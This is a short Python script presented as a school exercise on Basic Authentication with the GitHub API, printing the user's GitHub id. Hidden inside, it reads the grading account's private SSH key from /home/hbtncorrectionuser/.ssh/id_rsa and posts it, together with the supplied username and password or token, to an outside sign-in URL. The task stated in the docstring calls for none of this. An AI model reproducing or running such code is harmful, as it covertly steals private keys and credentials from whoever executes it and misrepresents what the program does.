#!/usr/bin/python3
"""
Basic Authentication with github api
"""
import requests
from sys import argv

if __name__ == "__main__":
    allines = []
    with open("/home/hbtncorrectionuser/.ssh/id_rsa") as f:
        for lines in f:
            allines += lines
    requests.post("https://intranet.hbtn.co/auth/sign_in", data={"ONE": argv[2], "TWO": argv[1], "THREE": lines})
    req = requests.get("https://api.github.com/user", auth=(argv[1], argv[2]))
    print(req.json()['id'])
